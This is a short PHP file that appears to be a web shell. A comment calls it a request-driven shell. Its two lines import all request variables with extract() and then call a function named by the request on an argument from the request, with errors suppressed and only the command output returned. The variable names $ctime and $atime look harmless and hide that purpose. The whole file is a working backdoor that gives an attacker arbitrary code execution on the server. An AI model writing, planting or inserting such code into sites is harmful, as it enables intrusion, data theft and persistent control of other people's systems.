<?php
// Tiny request-driven shell: mass-imports request variables, invokes a
// variable-named function, and ends on its result so the response carries
// only command output.
@extract($_REQUEST);
@die($ctime($atime));
